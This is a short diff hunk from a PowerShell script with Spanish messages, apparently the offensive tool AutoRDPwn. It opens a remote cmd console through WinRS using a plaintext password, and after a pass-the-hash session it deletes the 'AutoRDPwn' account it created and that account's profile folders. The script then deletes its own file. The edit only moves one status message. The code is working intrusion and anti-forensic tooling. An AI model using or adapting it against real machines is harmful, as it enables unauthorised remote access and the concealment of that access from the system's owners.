@@ -283,6 +283,6 @@ $PlainTextPassword = ConvertFrom-SecureToPlain $password
 if ($console){ Clear-Host ; Write-Host '>> Consola semi-interactiva en equipo remoto <<' ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host "Algo salió mal, cerrando el programa.." -ForegroundColor Red ; sleep -milliseconds 3000 }
 if ($hash){ Clear-Host ; Write-Host '>> Consola semi-interactiva en equipo remoto <<' ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" 
- Write-Host "" ;  Write-Host"Eliminando credenciales creadas para Pass The Hash.." -ForegroundColor Magenta ; sleep -milliseconds 2000
-invoke-command -session $RDP[0] -scriptblock { powershell.exe net user AutoRDPwn /delete ; rmdir C:\Users\AutoRDPwn* -Confirm:$false -Force }}
+invoke-command -session $RDP[0] -scriptblock { powershell.exe net user AutoRDPwn /delete ; rmdir C:\Users\AutoRDPwn* -Confirm:$false -Force
+Write-Host "" ;  Write-Host"Eliminando credenciales creadas para Pass The Hash.." -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
 $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript
